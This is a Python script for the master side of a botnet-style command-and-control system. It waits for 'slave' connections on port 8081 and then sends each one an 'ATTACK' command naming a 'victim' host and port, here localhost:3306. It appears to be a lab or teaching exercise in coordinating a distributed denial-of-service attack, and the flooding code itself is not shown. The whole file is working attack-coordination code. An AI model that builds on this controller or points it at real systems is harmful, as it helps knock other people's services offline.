import time, datetime, sys, re
from socket import *
from time import ctime
import time

##Setting up variables
VICTIM_HOST = "localhost"
VICTIM_PORT = 3306
MS_LISTEN_HOST = 'localhost'
MS_LISTEN_PORT = 8081


class Master():
    def __init__(self):
        print("initiating the master instance")
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.slaves = {}

        self.server_ip = VICTIM_HOST
        self.server_port = VICTIM_PORT
        self.maxSlaves = 1
        # get ntp times
        # self.ntpc = ntplib.NTPClient()
        # self.ntp_res = self.ntpc.request('10.1.1.50', version=3)
        print("finished initiating")

    def __del__(self):
        print("deleting the instance")

    def getMaxSlaves(self):
        print("max number of slaves= " + str(self.maxSlaves))
        return self.maxSlaves

    def listenConnections(self):
        self.sock.bind((MS_LISTEN_HOST, MS_LISTEN_PORT))
        self.sock.listen(self.maxSlaves)

    def acceptConnections(self):
        conn, addr = self.sock.accept()
        print('Accepting connection {0}'.format(addr))
        print('Conn is {0}'.format(conn))
        # msg_buf = conn.recv(64)
        # if len(msg_buf) > 0:
        #    print(msg_buf)
        # conn.send('Master offset is: {0}'.format(self.ntp_res.offset))
        self.slaves[addr] = conn
        print("conn added")

    def launchAttack(self):
        print("launching attack")
        for slave_addr, conn in self.slaves.items():
            command='ATTACK {0} {1}'.format(self.server_ip, self.server_port)
            conn.send(bytes(command,'UTF-8'))

    def closeConnection(self):
        print("closing connections")
        # for slave_addr, conn in self.slaves.iteritems():
        for slave_addr, conn in self.slaves.items():
            print("Closing connection to: " + str(slave_addr))
            conn.send(b"CLOSE")
        self.sock.close()


if __name__ == '__main__':
    masterServer = Master()
    masterServer.listenConnections()
    masterServer.acceptConnections()
    # while 1:
    # masterServer.acceptConnections()
    # if len(masterServer.slaves) >= masterServer.getMaxSlaves():
    #    break
    # time.sleep(5)
    masterServer.launchAttack()
    print("attack has been launched")
    masterServer.closeConnection()
    print("goodbye from master")
